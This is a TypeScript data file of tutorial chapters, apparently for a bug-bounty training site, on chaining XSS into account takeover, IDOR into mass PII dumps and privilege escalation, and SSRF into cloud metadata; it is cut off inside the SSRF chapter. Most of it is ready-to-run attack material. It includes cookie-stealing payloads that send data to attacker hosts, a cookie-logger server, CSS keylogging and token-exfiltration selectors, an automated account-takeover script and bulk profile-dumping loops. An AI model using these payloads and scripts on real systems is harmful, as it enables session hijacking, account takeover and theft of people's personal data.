import type { ReconChapter } from "./recon-flow-data"

export const chainingChapters: ReconChapter[] = [
  {
    id: "xss-to-ato",
    number: 1,
    title: "XSS → Session Hijack → Account Takeover",
    subtitle: "Chain a reflected XSS into full account compromise",
    color: "oklch(0.55 0.22 25)",
    overview:
      "Cross-Site Scripting (XSS) alone is often rated 'Medium' severity — but chain it with session theft and you have a Critical account takeover. This chapter teaches you to find XSS, capture cookies via a listener, hijack active sessions, and escalate to full ATO. Every bug hunter should master this chain — it's the most common path to a high-bounty payout.",
    sections: [
      {
        title: "XSS Discovery & Confirmation",
        text: "You can't exploit what you can't find. Start with automated scanners to cast a wide net, then manually confirm each finding. Focus on stored XSS in user-profile fields, comments, and support tickets — these persist and affect other users. Reflected XSS in search params and redirects also work if you can phish an admin.",
        commands: [
          {
            cmd: "cat live-urls.txt | nuclei -t ~/nuclei-templates/ -tags xss -o xss-candidates.txt",
            desc: "Scan all live URLs with Nuclei's XSS template collection — catches reflected, stored, and DOM-based XSS",
          },
          {
            cmd: "cat xss-candidates.txt | grep -iE 'stored|persistent' | tee stored-xss.txt",
            desc: "Filter for stored/persistent XSS candidates — these are the most valuable for chaining",
          },
          {
            cmd: "echo '<script>fetch(\"https://YOUR-COLLAB.com/?c=\"+document.cookie)</script>' > payload.txt",
            desc: "Create a cookie-stealing payload that exfiltrates cookies to your collaborator/Interactsh server",
          },
          {
            cmd: "cat live-urls.txt | dalfox -b YOUR-COLLAB piped mode | tee dalfox-results.txt",
            desc: "Run Dalfox in blind XSS mode — auto-injects payloads that phone back when executed by a victim",
          },
          {
            cmd: "curl 'https://target.com/search?q=<script>alert(1)</script>' | grep -i 'alert'",
            desc: "Quick manual XSS test — inject a simple alert payload and check if it reflects unfiltered",
          },
          {
            cmd: "cat live-urls.txt | grep -E '\\?|&' | httpx -silent -x GET -param 'q=<img+src=x+onerror=alert(1)>' -o xss-probed.txt",
            desc: "Parameterized XSS probe — injects a payload into each URL parameter and checks for reflection",
          },
          {
            cmd: "python3 -c \"import urllib.parse; print(urllib.parse.quote('<script>document.location=\\\'https://YOUR-SERVER/?\\'+document.cookie</script>'))\"",
            desc: "URL-encode a cookie-stealing payload for use in reflected XSS via URL parameters",
          },
        ],
        tips: [
          "Use dalfox for automated XSS scanning — it's purpose-built for XSS and has better detection than generic scanners",
          "Blind XSS payloads (waiting for an admin to trigger them) often yield higher bounties than self-XSS",
          "Test every input vector: URL params, POST body, headers (User-Agent, Referer), file upload filenames, JSON params",
          "Interactsh (interact.sh) provides free collaborator endpoints for blind XSS detection",
        ],
      },
      {
        title: "Setting Up a Cookie Catcher",
        text: "Before exploiting XSS, you need a server to receive stolen cookies. A simple Python HTTP server works for testing. For production, use Interactsh or deploy a small VPS with nginx. The key is to log every request with the full cookie value so you can replay it later.",
        commands: [
          {
            cmd: "python3 -m http.server 8080 --bind 0.0.0.0",
            desc: "Minimal HTTP server — logs all incoming requests including stolen cookies in query params",
          },
          {
            cmd: 'cat << \'EOF\' > cookie-logger.py\n#!/usr/bin/env python3\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nimport urllib.parse\n\nclass CookieHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        params = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)\n        if "c" in params:\n            cookie = params["c"][0]\n            with open("stolen-cookies.txt", "a") as f:\n                f.write(f"{cookie}\\n")\n            print(f"[+] COOKIE STOLEN: {cookie}")\n        self.send_response(200)\n        self.end_headers()\n        self.wfile.write(b"ok")\n\nHTTPServer(("0.0.0.0", 8080), CookieHandler).serve_forever()\nEOF\nchmod +x cookie-logger.py && python3 cookie-logger.py',
            desc: "Dedicated cookie logger server — auto-logs cookies to a file, ready for replay against the target",
          },
          {
            cmd: "interactsh-client -v | tee interactsh.log",
            desc: "Start Interactsh client — provides a unique collaborator URL for blind XSS detection with verbose logging",
          },
          {
            cmd: "ngrok http 8080 --log=stdout > ngrok.log 2>&1 &",
            desc: "Expose your local cookie logger via ngrok — get a public URL that tunnels to your local server",
          },
          {
            cmd: "echo 'https://YOUR-NGROK.ngrok.io/?c=' | xclip -selection clipboard",
            desc: "Copy your collaborator URL to clipboard — ready to paste into XSS payloads for quick testing",
          },
          {
            cmd: "tail -f stolen-cookies.txt",
            desc: "Watch for incoming cookies in real-time — each new line is a stolen session waiting to be hijacked",
          },
        ],
        tips: [
          "Use Interactsh over ngrok for stealth — Interactsh looks like a CDN, ngrok domains are well-known to WAFs",
          "Always log every request, not just cookies — the IP, User-Agent, and Referer help identify the victim",
          "Run your cookie catcher on a VPS with HTTPS — modern browsers block document.cookie on HTTP responses",
          "Set a custom subdomain for your catcher to avoid being blacklisted by security tools",
        ],
      },
      {
        title: "Crafting the XSS Payload",
        text: "Modern browsers have HttpOnly and Secure flags that prevent JavaScript from reading cookies via document.cookie. But not all cookies are protected. Even when session cookies are HttpOnly, you can still steal CSRF tokens, perform actions on behalf of the user, or use the XSS to modify the page in real-time.",
        commands: [
          {
            cmd: "'><script>new Image().src=\"https://YOUR-SERVER/?c=\"+document.cookie</script>",
            desc: "Classic cookie-stealer via image request — fires immediately, no user interaction needed",
          },
          {
            cmd: "'\"><img src=x onerror=\"fetch('https://YOUR-SERVER/?c='+document.cookie)\">",
            desc: "Img tag variant that works when script tags are blocked by CSP or WAF rules",
          },
          {
            cmd: "'\"><svg onload=\"fetch('https://YOUR-SERVER/?c='+btoa(document.cookie))\">",
            desc: "SVG onload payload with base64-encoded cookie — bypasses filters detecting 'document.cookie' as plaintext",
          },
          {
            cmd: "fetch('/api/user/profile').then(r=>r.json()).then(d=>fetch('https://YOUR-SERVER/?d='+btoa(JSON.stringify(d))))",
            desc: "XSS payload that fetches the victim's profile data and exfiltrates it — useful when cookies are HttpOnly",
          },
          {
            cmd: "document.querySelector('input[name=csrf]')?.value || 'no-csrf'",
            desc: "Test query to check if CSRF tokens are accessible from JavaScript — if yes, you can forge requests without the session cookie",
          },
          {
            cmd: "fetch('https://YOUR-SERVER/?html='+btoa(document.body.innerHTML))",
            desc: "Exfiltrate the entire page HTML — useful for finding CSRF forms, API tokens, and user-specific data",
          },
          {
            cmd: "navigator.sendBeacon('https://YOUR-SERVER/log', document.cookie)",
            desc: "SendBeacon payload — fires even when the page is being unloaded, more reliable than fetch for exfiltration",
          },
        ],
        tips: [
          "Base64-encode stolen data to prevent URL truncation from long cookie values — btoa() in JavaScript",
          "Test payloads in a browser console first to verify they work before deploying against the target",
          "When HttpOnly is set, pivot to CSRF token theft or performing actions via fetch() on behalf of the user",
          "Many WAFs block <script> but allow <img onerror> and <svg onload> — always have multiple payload variants ready",
        ],
      },
      {
        title: "Session Hijacking & Account Takeover",
        text: "With a stolen session cookie, you can impersonate the victim. But timing matters — sessions expire, IP checks trigger, and MFA may reset tokens on suspicious activity. This section covers cookie replay, session validation, and escalating from a hijacked session to full account takeover.",
        commands: [
          {
            cmd: "curl -s 'https://target.com/api/user/profile' -H 'Cookie: session=STOLEN_SESSION_VALUE' | jq .",
            desc: "Replay the stolen cookie against an authenticated API endpoint — if it returns user data, the session is alive",
          },
          {
            cmd: "curl -s -I 'https://target.com/dashboard' -H 'Cookie: session=STOLEN_SESSION_VALUE' | grep -i 'set-cookie'",
            desc: "Check if the server sets a new session cookie — if yes, the old one was rotated and you need to re-steal",
          },
          {
            cmd: '#!/bin/bash\n# hijack.sh — replay cookie against multiple endpoints\nCOOKIE="session=STOLEN_VALUE"\nfor path in /dashboard /api/user /profile /account /admin; do\n  status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path" -H "Cookie: $COOKIE")\n  echo "$path → $status"\ndone',
            desc: "Cookie replay script — test the stolen session against multiple endpoints to assess access level",
          },
          {
            cmd: "curl -s 'https://target.com/api/user/profile' -H 'Cookie: session=STOLEN_VALUE' -H 'User-Agent: VICTIMS_UA' | jq '.email, .role, .two_factor_enabled'",
            desc: "Extract victim details — email, role, and MFA status help you plan the next step",
          },
          {
            cmd: "curl -s -X POST 'https://target.com/api/user/change-email' -H 'Cookie: session=STOLEN_VALUE' -H 'Content-Type: application/json' -d '{\"email\":\"attacker@evil.com\"}'",
            desc: "Email change request via API — if successful, triggers password reset to your email, completing ATO",
          },
          {
            cmd: "curl -s -X POST 'https://target.com/api/user/export-data' -H 'Cookie: session=STOLEN_VALUE'",
            desc: "Data export request — exfiltrate the victim's personal data (PII) for maximum impact reporting",
          },
          {
            cmd: 'cat << \'EOF\' > auto-ato.py\n#!/usr/bin/env python3\nimport requests, sys\nbase = sys.argv[1]\ncookie = {"session": sys.argv[2]}\n# Step 1: Verify session\nr = requests.get(f"{base}/api/user/profile", cookies=cookie)\nprint(f"[+] Logged in as: {r.json().get(\"email\")}")\n# Step 2: Extract CSRF token\nr = requests.get(f"{base}/dashboard", cookies=cookie)\ntoken = r.text.split(\'csrf_token"\')[1].split(\'"\')[1]\nprint(f"[+] CSRF token: {token}")\n# Step 3: Change email (ATO)\nr = requests.post(f"{base}/api/user/change-email", json={"email": "owned@evil.com"}, cookies=cookie, headers={"X-CSRF-Token": token})\nprint(f"[+] ATO result: {r.status_code}")\nEOF',
            desc: "Full ATO automation script — verify session, extract CSRF token, and change email in one command",
          },
        ],
        tips: [
          "Always check if the session has admin privileges before reporting — admin ATO is worth significantly more",
          "Document every step with screenshots and request/response pairs — programs need clear evidence to validate",
          "If the session has MFA, you can often disable it via the security settings page once you're logged in",
          "Some programs require you to prove account ownership — transfer the email to a domain you control for validation",
        ],
      },
      {
        title: "DOM Clobbering & Mutation XSS",
        text: "DOM Clobbering lets you inject HTML elements that shadow JavaScript variables — bypassing CSP entirely because no inline script executes. Mutation XSS (mXSS) exploits sanitizer bugs where the DOM mutates after sanitization, turning a safe string into executable code. These are the most creative XSS vectors and often bypass every WAF and CSP.",
        commands: [
          {
            cmd: "cat live-urls.txt | grep -E 'id=|name=|class=' | head -20",
            desc: "Find elements with id/name attributes — DOM clobbering targets elements that become global window properties",
          },
          {
            cmd: "'\"><a id=\"x\"><a id=\"x\" href=\"javascript:alert(1)\">click</a>",
            desc: "DOM clobbering payload: anchor elements with the same ID shadow each other — href becomes clobbered property",
          },
          {
            cmd: "'\"><form id=\"config\"><input name=\"csrf\" value=\"attacker-token\"></form><script>submitForm(config.csrf.value)</script>",
            desc: "Clobber form.config.csrf — shadows the real CSRF token with an attacker-controlled value",
          },
          {
            cmd: "'\"><img src=x><iframe srcdoc=\"<script>alert(1)</script>\">",
            desc: "mXSS via iframe srcdoc — sanitizer sees a harmless img tag, browser renders the iframe with script execution",
          },
          {
            cmd: "cat live-urls.txt | grep -i 'innerHTML\\|insertAdjacentHTML\\|DOMPurify\\|sanitize' > dom-sink-candidates.txt",
            desc: "Find pages using innerHTML or DOMPurify — mXSS requires DOM mutation sinks after sanitization",
          },
          {
            cmd: "python3 -c \"import html; payload = '<math><style><!--</style><img src=x onerror=alert(1)>'; print('Test with DOMPurify:', payload)\"",
            desc: "Classic mXSS payload: math+style+comment tricks DOMPurify into accepting dangerous content that mutates later",
          },
          {
            cmd: "cat dom-sink-candidates.txt | nuclei -t ~/nuclei-templates/ -tags dom-xss -o dom-xss-candidates.txt",
            desc: "Scan discovered DOM sinks for DOM-based XSS — catches clobbering and mutation vectors automatically",
          },
        ],
        tips: [
          "DOM clobbering works best on pages that access element IDs as global variables — check for window.x patterns in JS",
          "mXSS payloads differ per sanitizer library — DOMPurify 2.x has different bypasses than 3.x",
          "Test mXSS by injecting through the HTML parser, not JavaScript — the mutation happens AFTER sanitization",
          "Use the browser's debugger to step through sanitizer output — mutation happens between DOM tree insertion and re-serialization",
        ],
      },
      {
        title: "CSS Injection — Keylogging & Token Theft",
        text: "CSS injection is the most underestimated XSS vector. When you can inject arbitrary CSS, you can exfiltrate data without JavaScript at all. CSS attribute selectors can leak CSRF tokens character by character via background-image URL callbacks. CSS keylogging via @font-face + ligature fonts captures every keystroke — completely silently.",
        commands: [
          {
            cmd: "'\"><style>input[type=password][value^=\"a\"]{background:url(https://YOUR-SERVER/?char=a)}</style>",
            desc: "CSS attribute selector: fires a callback when the password input value starts with 'a' — brute-forceable character by character",
          },
          {
            cmd: 'cat << \'EOF\' > css-exfiltrator.html\n<!DOCTYPE html><html><head>\n<style>\n@font-face { font-family: x; src: url(https://YOUR-SERVER/font?q=), local(Times New Roman);}\ninput { font-family: x; }\n</style></head><body>\n<!-- inject this into a page where you control CSS -->\nEOF\necho "CSS exfiltration template — inject this via <style> tag in your XSS payload"',
            desc: "CSS keylogger template — custom font family triggers font-load callback on keystroke, capturing typed keys",
          },
          {
            cmd: "'\"><style>@import url(//YOUR-SERVER/style.css)</style>",
            desc: "CSS @import exfiltration: your server receives the request immediately when the CSS loads — proves injection works",
          },
          {
            cmd: `python3 -c "
import string, urllib.parse
css = ''
for c in string.hexdigits:
  selector = f'input[name=csrf][value*=\\"{c}\\"]{{background:url(https://YOUR-SERVER/tokenc={c})}}'
  css += selector + '\\n'
print(urllib.parse.quote(css))
"`,
            desc: "Generate CSS selectors for every hex character — when injected, brute-forces CSRF tokens char by char via callbacks",
          },
          {
            cmd: "'\"><link rel=\"stylesheet\" href=\"https://YOUR-SERVER/evil.css\">",
            desc: "External CSS import — loads your stylesheet from your server, confirming CSS injection and enabling larger payloads",
          },
          {
            cmd: "'\"><style>#secret{background:url(https://YOUR-SERVER/?id=)}:has(#secret){background:url(https://YOUR-SERVER/?found=yes)}</style>",
            desc: "CSS :has() selector — modern CSS pseudo-class that detects if an element with a given ID exists on the page",
          },
          {
            cmd: "echo '<style>body{background:url(https://YOUR-SERVER/body)}</style>' | dalfox pipe --custom-payload -",
            desc: "CSS-only XSS payload via dalfox — injects a CSS payload that fires a callback without any JavaScript execution",
          },
        ],
        tips: [
          "CSS injection bypasses CSP completely — CSP blocks scripts but has no control over CSS (except style-src if set)",
          "Chrome limits CSS @import to 30 seconds — use inline <style> tags for persistent injection, not @import",
          "CSS attribute selectors work on input values that are already filled — combine with autofill for higher success",
          "Combine CSS injection with :target pseudo-class to detect which links on the page were clicked by the victim",
        ],
      },
    ],
    tools: [
      {
        name: "dalfox",
        desc: "Fast XSS scanner with blind XSS mode, parameter analysis, and automatic payload generation",
        install: "go install github.com/hahwul/dalfox/v2@latest",
        link: "https://github.com/hahwul/dalfox",
      },
      {
        name: "interactsh",
        desc: "Out-of-band interaction client for blind XSS, SSRF, and XXE detection — free collaborator URLs",
        install: "go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest",
        link: "https://github.com/projectdiscovery/interactsh",
      },
      {
        name: "ngrok",
        desc: "Tunneling service that exposes your local server via a public URL — useful for cookie catching",
        link: "https://ngrok.com/",
      },
      {
        name: "curl",
        desc: "Universal HTTP client for cookie replay, request forgery, and API testing",
        install: "apt install curl",
        link: "https://curl.se/",
      },
    ],
    summary:
      "You now understand the XSS-to-ATO chain end-to-end: discovering XSS vulnerabilities, setting up a cookie catcher, crafting payloads that bypass modern protections, and replaying sessions to take over accounts. This is the most reliable chain for high-severity bug bounty reports.",
  },
  {
    id: "idor-to-breach",
    number: 2,
    title: "IDOR → PII Leak → Privilege Escalation",
    subtitle: "Exploit missing access controls to leak data and escalate privileges",
    color: "oklch(0.72 0.16 75)",
    overview:
      "Insecure Direct Object References (IDOR) are the most common access control flaw on the web. When an API trusts user-supplied IDs without verifying ownership, anyone can access anyone else's data. This chapter covers finding IDORs at scale, automating data exfiltration, and chaining multiple IDORs to escalate from user to admin.",
    sections: [
      {
        title: "IDOR Discovery at Scale",
        text: "IDORs hide in API endpoints that accept user IDs, document IDs, order numbers, or sequential integers. The key is to replace your ID with another user's ID and observe the response. Automate this by creating two accounts, collecting endpoints from one, and replaying them against the other.",
        commands: [
          {
            cmd: "cat live-urls.txt | grep -E '/api/|/v[0-9]/|/user/|/document/|/order/|/profile/' > api-endpoints.txt",
            desc: "Extract all potential API endpoints from your recon data — IDORs live in authenticated routes with IDs",
          },
          {
            cmd: "cat api-endpoints.txt | httpx -silent -mc 200 -o accessible-apis.txt",
            desc: "Probe which endpoints return 200 — many hidden API routes respond but aren't linked from the frontend",
          },
          {
            cmd: "burp-stateful-idor.py --url https://target.com/api/user/1337 --session 'your-session' --iterations 50",
            desc: "Automated IDOR scanner that iterates through user IDs to find accessible profiles (requires Burp or custom script)",
          },
          {
            cmd: "cat accessible-apis.txt | grep -E '[0-9]{4,}' | sed 's/[0-9]\\{4,\\}/FUZZ/g' | sort -u",
            desc: "Normalize API paths by replacing numeric IDs with FUZZ — ready for fuzzing with ffuf or nuclei",
          },
          {
            cmd: "ffuf -u 'https://target.com/api/user/FUZZ/profile' -w ids.txt -H 'Cookie: session=YOUR_SESSION' -fc 403,404 -o ffuf-idor.json",
            desc: "Fuzz user IDs through an authenticated endpoint — filter out 403/404 to find accessible profiles",
          },
          {
            cmd: "cat ffuf-idor.json | jq -r '.results[] | select(.status == 200) | .input.FUZZ' > valid-idor-ids.txt",
            desc: "Extract all user IDs that returned 200 — these are potential IDOR hits worth manual investigation",
          },
          {
            cmd: "autorize --url https://target.com --low-priv-session 'user123' --admin-url https://target.com/admin -o autorize-report.html",
            desc: "Run Autorize — compares responses with low-priv vs admin session to find privilege escalation paths",
          },
        ],
        tips: [
          "Create two test accounts (User A and User B) — collect endpoints with A's cookie, replay them with B's cookie",
          "Look for UUIDs, hashes, and base64-encoded IDs — not just integers. Decode them to find patterns",
          "Some IDORs only leak data — not all IDORs let you modify data. Report any unauthorized data access",
          "GraphQL endpoints are IDOR goldmines — introspection reveals all queries, and many lack per-query access controls",
        ],
      },
      {
        title: "Automated Data Exfiltration",
        text: "Once you've found an IDOR, automate the extraction. A single IDOR might expose one record — automation lets you dump thousands. The goal is to demonstrate impact: collect enough PII to prove a data breach. Always set limits and respect program scope during automated extraction.",
        commands: [
          {
            cmd: `#!/bin/bash
# mass-idor-dump.sh — extract all user profiles
API="https://target.com/api/user"
COOKIE="session=YOUR_SESSION"
for id in $(seq 1000 2000); do
  data=$(curl -s "$API/$id/profile" -H "Cookie: $COOKIE")
  if echo "$data" | grep -q '"email"'; then
    echo "$id: $data" >> idor-dump.txt
    echo "Found user $id"
  fi
done
echo "Dumped $(wc -l < idor-dump.txt) profiles"`,
            desc: "Mass profile dumper — iterates through user IDs 1000-2000 and saves any that return profile data",
          },
          {
            cmd: "cat idor-dump.txt | grep -oP '\"email\":\"[^\"]+' | cut -d'\"' -f4 | sort -u > leaked-emails.txt",
            desc: "Extract all leaked email addresses from your IDOR dump — quantifiable PII for the report",
          },
          {
            cmd: "cat idor-dump.txt | grep -oP '\"phone\":\"[^\"]+' | cut -d'\"' -f4 | sort -u > leaked-phones.txt",
            desc: "Extract phone numbers — demonstrates sensitive PII is accessible, increasing report severity",
          },
          {
            cmd: '#!/bin/bash\n# idor-diff.sh — compare two users to confirm IDOR\nUSER_A=$(curl -s "https://target.com/api/user/1/profile" -H "Cookie: $SESSION_A" | jq -c .)\nUSER_B=$(curl -s "https://target.com/api/user/2/profile" -H "Cookie: $SESSION_A" | jq -c .)\nif [ "$USER_A" != "$USER_B" ]; then\n  echo "IDOR CONFIRMED: User A sees different data for user 1 vs user 2"\n  echo "User 1: $USER_A"\n  echo "User 2: $USER_B"\nfi',
            desc: "IDOR confirmation script — compare two users' data from the same session to prove access control failure",
          },
          {
            cmd: "parallel -j 10 'curl -s \"https://target.com/api/order/{}\" -H \"Cookie: $COOKIE\"' :::: id-list.txt > all-orders.json",
            desc: "Parallel IDOR dump with GNU Parallel — 10 simultaneous requests, useful for time-sensitive extraction",
          },
          {
            cmd: "cat all-orders.json | jq -s '[.[] | {id: .id, total: .total, email: .email}]' > summarized-leak.json",
            desc: "Summarize extracted JSON into a clean report format — id, total, email per order for impact demonstration",
          },
        ],
        tips: [
          "Never dump ALL records without limits — some programs consider mass extraction as hostile activity",
          "Extract a representative sample (50-100 records) to prove impact, not the entire database",
          "Document the total number of accessible records — 'IDOR exposes 50,000 user profiles' is a stronger finding",
          "Some platforms rate-limit after N requests — use parallel with caution and respect the target's infrastructure",
        ],
      },
      {
        title: "Chaining IDORs for Privilege Escalation",
        text: "One IDOR might reveal a user's email. A second IDOR on a different endpoint lets you change that user's password. Chain them together for a privilege escalation. The most powerful chains involve IDORs that leak security questions, reset tokens, or allow direct role modification.",
        commands: [
          {
            cmd: "curl -s 'https://target.com/api/user/1337/security-questions' -H 'Cookie: YOUR_SESSION' | jq .",
            desc: "Check if security questions are exposed via IDOR — if yes, you can answer them for any user",
          },
          {
            cmd: "curl -s -X POST 'https://target.com/api/user/password/reset' -H 'Content-Type: application/json' -d '{\"email\":\"victim@target.com\"}'",
            desc: "Trigger a password reset for the victim via their leaked email — second step in the escalation chain",
          },
          {
            cmd: "curl -s 'https://target.com/api/password-reset/confirm?token=LEAKED_TOKEN' -H 'Cookie: YOUR_SESSION' | jq .",
            desc: "Check if password reset tokens are exposed via another IDOR — chain: email leak → token leak → password change",
          },
          {
            cmd: "curl -s -X PUT 'https://target.com/api/user/1337/role' -H 'Cookie: YOUR_SESSION' -H 'Content-Type: application/json' -d '{\"role\":\"admin\"}'",
            desc: "IDOR-based privilege escalation — try changing another user's role directly via the API endpoint",
          },
          {
            cmd: "curl -s 'https://target.com/api/admin/users' -H 'Cookie: USER_SESSION' | jq '. | length'",
            desc: "After escalating to admin via IDOR, confirm access to admin-only endpoints — the final link in the chain",
          },
          {
            cmd: "curl -s -X DELETE 'https://target.com/api/user/1337/documents' -H 'Cookie: YOUR_SESSION'",
            desc: "Check for destructive IDOR — unauthorized deletion of another user's data is a critical finding",
          },
          {
            cmd: "for user in $(cat leaked-user-ids.txt); do echo \"User $user role: $(curl -s \"https://target.com/api/user/$user/role\" -H \"Cookie: SESSION\" | jq -r .role)\"; done",
            desc: "Bulk role check — probe multiple users' roles via IDOR to find admin accounts for targeted attacks",
          },
        ],
        tips: [
          "Document the exact chain of API calls needed to escalate — programs reward chain complexity",
          "Some IDORs only work on certain HTTP methods (GET works but PUT doesn't) — test all methods",
          "GraphQL mutations combined with IDOR are extremely powerful — try modifying other users' data via GraphQL",
          "The best IDOR chains bypass MFA entirely — if you can change email/password via IDOR, MFA is irrelevant",
        ],
      },
      {
        title: "GraphQL Alias IDOR — Batch Access Control Bypass",
        text: "GraphQL aliases let you query the same field multiple times in one request with different arguments. When access control is checked once per query (not per field), you can leak every user's data in a single request by aliasing the same field with different IDs. This bypasses per-query rate limits and often evades access control entirely.",
        commands: [
          {
            cmd: 'cat << \'EOF\' > graphql-idor.txt\nquery MassIDOR {\n  user1: user(id: 1) { email role ssn }\n  user2: user(id: 2) { email role ssn }\n  user3: user(id: 3) { email role ssn }\n  user4: user(id: 4) { email role ssn }\n  user5: user(id: 5) { email role ssn }\n}',
            desc: "GraphQL alias IDOR: one query, 5 different user IDs — if access control checks once per query, all leak at once",
          },
          {
            cmd: "curl -s -X POST 'https://target.com/graphql' -H 'Content-Type: application/json' -H 'Cookie: YOUR_SESSION' -d '{\"query\":\"query M{user1:user(id:1){email}}user2:user(id:2){email}}\"}' | jq .",
            desc: "Send the alias IDOR query via curl — compact inline form to quickly test for batch data leaks",
          },
          {
            cmd: "python3 -c \"q = 'query M{' + ' '.join([f'u{i}:user(id:{i}){{email}}' for i in range(1,51)]) + '}'; print(q)\" | tee mass-alias-query.txt",
            desc: "Generate a GraphQL query with 50 aliases — leaks 50 user emails in one request if access control is broken",
          },
          {
            cmd: "curl -s -X POST 'https://target.com/graphql' -H 'Content-Type: application/json' -H 'Cookie: SESSION' -d @mass-alias-query.txt | jq -r '.data | to_entries[] | select(.value != null) | [.key, .value.email] | @tsv'",
            desc: "Parse the alias IDOR response — extract only non-null results (confirmed accessible users) with their emails",
          },
          {
            cmd: "cat live-urls.txt | grep -i '/graphql\\|/gql\\|/v1/graphql\\|/query' > graphql-endpoints.txt",
            desc: "Discover GraphQL endpoints from your recon data — every GraphQL endpoint is a potential alias IDOR target",
          },
          {
            cmd: "curl -s 'https://target.com/graphql' -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}' | jq '.data.__schema.types[].name' | head -40",
            desc: "GraphQL introspection query — dump all available types to find user and user-like objects for alias IDOR",
          },
          {
            cmd: "cat graphql-endpoints.txt | while read url; do curl -s \"$url\" -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{queryType{fields{name}}}}\"}' | jq -r '.data.__schema.queryType.fields[].name' | tee \"$(echo $url | tr '/' '_')-queries.txt\"; done",
            desc: "Batch introspection across all discovered GraphQL endpoints — identify which ones expose user queries",
          },
        ],
        tips: [
          "GraphQL alias IDOR works because many servers batch-resolve aliases before checking access control on each field",
          "Some APIs enforce access control in resolvers — alias IDOR won't work there, but try deep aliasing (nested queries)",
          "Combine alias IDOR with persisted queries — some apps whitelist queries by hash but don't check aliases within them",
          "Use @skip and @include directives with aliases to dynamically control which user IDs are queried in each request",
        ],
      },
      {
        title: "Timing & Side-Channel IDOR Detection",
        text: "Not all IDORs show data directly — some leak information through side channels. A different response time indicates the record exists but access is denied. A different content-length (even when body is 'unauthorized') means the server processed different data. These blind IDORs require creative detection but can still prove impact.",
        commands: [
          {
            cmd: '#!/bin/bash\n# idor-timing.sh — detect IDOR via response timing differences\nfor id in $(seq 1 100); do\n  start=$(date +%s%N)\n  status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/api/user/$id" -H "Cookie: SESSION")\n  end=$(date +%s%N)\n  ms=$(( (end - start) / 1000000 ))\n  echo "$id: $status ($ms ms)"\ndone',
            desc: "Timing-based IDOR scanner: records response time per user ID — slower responses may indicate real data processing",
          },
          {
            cmd: "cat idor-timing-results.txt | sort -t'(' -k2 -rn | head -20",
            desc: "Sort timing results by response time — the slowest responses likely indicate real data was loaded internally",
          },
          {
            cmd: '#!/bin/bash\n# content-length-idor.sh\nfor id in $(seq 1 100); do\n  len=$(curl -s -o /dev/null -w "%{size_download}" "https://target.com/api/user/$id" -H "Cookie: SESSION")\n  echo "$id: $len bytes"\ndone | sort -t: -k2 -rn | head -20',
            desc: "Content-length IDOR detection: different response sizes for different IDs (even with 'unauthorized' body) indicate data access",
          },
          {
            cmd: "curl -s -o /dev/null -w '%{http_code} %{size_download} %{time_total}' 'https://target.com/api/user/1' -H 'Cookie: SESSION'",
            desc: "Single-request probe: http_code + size + timing in one command — three side-channel signals for IDOR detection",
          },
          {
            cmd: "curl -s -D - 'https://target.com/api/user/1' -H 'Cookie: SESSION' -o /dev/null 2>&1 | head -20",
            desc: "Dump response headers — some IDORs leak the user ID via X-User-Id, Location, or ETag headers even when body is hidden",
          },
          {
            cmd: "diff <(curl -s 'https://target.com/api/user/1' -H 'Cookie: SESSION_A') <(curl -s 'https://target.com/api/user/2' -H 'Cookie: SESSION_A')",
            desc: "Side-channel diff: compare responses for user 1 vs user 2 using the same session — any difference = IDOR confirmed",
          },
          {
            cmd: "curl -s 'https://target.com/api/search/users?q=test' -H 'Cookie: SESSION' | jq '.data | length'",
            desc: "Search endpoint IDOR: if the search returns results including users from other organizations, that's a blind IDOR",
          },
        ],
        tips: [
          "Side-channel IDORs are harder to prove — document the timing difference across 10+ requests with screenshots",
          "Use the same session and same network conditions when comparing — timing differences should be statistically significant",
          "Content-length differences under 10 bytes are likely noise — focus on differences > 50 bytes",
          "Some IDORs only trigger on POST/PUT/DELETE but not GET — test all HTTP methods for timing differences",
        ],
      },
    ],
    tools: [
      {
        name: "ffuf",
        desc: "Fast web fuzzer for IDOR parameter discovery and ID enumeration",
        install: "go install github.com/ffuf/ffuf/v2@latest",
        link: "https://github.com/ffuf/ffuf",
      },
      {
        name: "autorize",
        desc: "Burp extension that performs automatic authorization checks for IDOR detection",
        link: "https://github.com/PortSwigger/autorize",
      },
      {
        name: "jq",
        desc: "Command-line JSON processor for parsing API responses and extracting leaked data",
        install: "apt install jq",
        link: "https://jqlang.github.io/jq/",
      },
      {
        name: "parallel",
        desc: "GNU Parallel for mass IDOR extraction — useful when you need to dump records quickly",
        install: "apt install parallel",
        link: "https://www.gnu.org/software/parallel/",
      },
    ],
    summary:
      "You now know how to find IDORs at scale, automate data exfiltration to demonstrate impact, and chain multiple IDORs together for privilege escalation. The IDOR-to-ATO chain consistently pays high bounties because it bypasses authentication entirely.",
  },
  {
    id: "ssrf-cloud-takeover",
    number: 3,
    title: "SSRF → Cloud Metadata → Credential Exfil",
    subtitle: "Turn a blind SSRF into total cloud compromise",
    color: "oklch(0.65 0.18 50)",
    overview:
      "Server-Side Request Forgery (SSRF) is the most dangerous cloud vulnerability. When a server fetches a URL you control, you can redirect it to the cloud metadata service, steal IAM credentials, and access the entire cloud environment. This chapter covers SSRF discovery, metadata service exploitation, and credential exfiltration.",
    sections: [
      {
        title: "SSRF Discovery Techniques",
        text: "SSRF lurks in any feature that fetches external content: webhooks, PDF generators, image processors, RSS feeds, and proxy functionality. Blind SSRF (no response visible) is harder to find but equally dangerous — use an external collaborator to detect callbacks. Time-based SSRF detection also works when you control request timing.",
        commands: [
          {
            cmd: "cat live-urls.txt | grep -iE 'url=|link=|src=|href=|redirect=|callback=|webhook=|fetch=|proxy=|path=' > ssrf-candidates.txt",
            desc: "Find potential SSRF-prone parameters — any param that might cause the server to fetch a URL",
          },
          {
            cmd: "curl -s 'https://target.com/fetch?url=http://YOUR-COLLABORATOR.oastify.com' -v 2>&1 | grep -i 'location\\|callback'",
            desc: "Test SSRF by injecting your collaborator URL — check server logs for incoming requests",
          },
          {
            cmd: "curl -s 'https://target.com/proxy?url=http://169.254.169.254/latest/meta-data/' -o metadata-response.txt",
            desc: "Direct cloud metadata probe — if the server fetches and returns 169.254.169.254, you have SSRF with data echo",
          },
          {
